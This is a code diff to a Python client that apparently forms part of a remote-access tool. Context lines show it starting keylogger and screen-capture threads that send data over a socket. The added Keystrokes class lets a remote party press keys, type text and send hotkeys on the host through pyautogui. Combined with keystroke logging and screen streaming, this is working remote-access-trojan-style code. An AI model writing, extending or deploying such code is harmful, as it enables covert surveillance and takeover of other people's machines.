@@ -8,6 +8,8 @@ import json
 from zlib import compress
 from mss import mss
 import base64
+import pyautogui
+
 
 WIDTH = 1900
 HEIGHT = 1000
@@ -30,6 +32,8 @@ class Main():
                              args=()).start()
         threading.Thread(target=self.screen_caprure,
                              args=()).start()
+        keystrokes = Keystrokes(self.client_socket)
+        keystrokes.getting_msg()
         
 
     def keylogger(self):
@@ -123,6 +127,43 @@ class Screen_Capture():
                 message_to_send = json.dumps(message)
                 SuperSocket(self.client_socket).send_msg((message_to_send).encode())
                 
+class Keystrokes():
+    def __init__(self, client_socket):
+        self.client_socket = client_socket
+        
+    def getting_msg(self):
+        while True:
+            data = (SuperSocket(self.client_socket).recv_msg()).decode()
+            message = json.loads(data)
+            if message["type"] == "command":
+                
+                if message["command"] == "press":
+                    self.press_key_stroke(message["buttons"])
+                    
+                elif message["command"] == "write":
+                    self.write_stroke(message["buttons"])
+                    
+                elif message["command"] == "hotkey":
+                    self.hotkey_stroke(message["buttons"])
+                    
+                else:
+                    pass
+            else:
+                pass
+            
+    def press_key_stroke(self, key):
+        self.key = key
+        pyautogui.press(self.key)
+        
+    def write_stroke(self, key):
+        self.key = key
+        pyautogui.write(self.key, interval=0.1)
+        
+    def hotkey_stroke(self, key):
+        self.key = key
+        self.splited_key = self.key.split("+")
+        pyautogui.hotkey(self.splited_key)
+        
 class SuperSocket():
     def __init__(self, current_socket):  # make the self.current_socket euqal to current_socket
         self.current_socket = current_socket
